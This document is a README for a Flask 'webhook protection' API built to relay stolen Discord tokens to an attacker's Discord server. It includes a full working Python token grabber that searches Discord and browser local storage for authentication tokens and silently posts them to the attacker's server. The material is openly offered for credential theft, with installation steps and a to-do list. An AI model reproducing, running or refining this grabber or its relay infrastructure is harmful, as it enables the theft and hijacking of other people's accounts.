# Discord Token Grabber API

 A Discord webhook REST API using Flask to protect Discord webhook URLs to prevent people from abusing it (spamming, deleting etc.).

## Usage

Instead of hardcoding your webhook URL in your applications and sending a lot of HTTP requests using the token in i.e. token grabbers, you can set up a webserver running this API that will do it all for you, while not exposing your webhook URL.

The API will validate and send the token information over the webhook URL provided in `config.json` .

To create new API endpoints, create a new Python file in directory `routes` and import it in `routes\__init__.py` under the line `# import here` .

## Example

Here's an example of a token grabber using the API instead of directly sending a webhook request.

``` py
import os
import re
import requests

# configuration
API_IP = '127.0.0.1'  # change to your server IP
API_PORT = 5001  # change to your API port defined in config.json
SECRET = 'aSPQq7gE86coXJbuikEbf9IEkablz6Rw' # change to your secret defined in config.json

# set paths to where tokens are stored
localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
paths = {
    'Discord': os.path.join(roaming, 'Discord'),
    'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
    'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
    'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
    'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
    'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
}

# grab tokens
tokens = []

for platform, path in paths.items():
    path = os.path.join(path, 'Local Storage', 'leveldb')

    if os.path.exists(path) is False:
        continue

    for item in os.listdir(path):
        if (item[-4:] in ('.log', '.ldb')) is False:
            continue

        with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
            lines = file.readlines()

        for line in lines:
            line = line.strip()

            if line == "":
                continue

            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                if token in tokens:
                    continue

                tokens.append(token)

# send tokens to the webhook protection API that will validate them and send them to your Discord server over webhook
try:
    data = {'secret': SECRET, 'tokens': tokens}

    # note that using json=data, requests module automatically sets the Content-Type header to application/json
    requests.post(f'http://{API_IP}:{API_PORT}/grab', json=data)
except:
    pass
```

Don't judge the token grabber. I made it simple to understand, not efficient : P

## Requirements

* Python 3
* Git (optional)
* Server to host API

## Installation

1. Install repository via `$ git clone https://github.com/ecriminal/Webhook-Protection.git`
2. Install required modules using `$ pip install -r requirements.txt`
3. Edit `config.json` file
4. Start webserver via `$ py main.py` (It's recommened to set up a proper production WSGI server)

## TODO

* [ ] Set up a MySQL database to store tokens, used to prevent dupes
* [ ] IP-address based rate limit to prevent abusers from flooding the API
* [ ] Support multiple tokens in a single request using `,` seperator
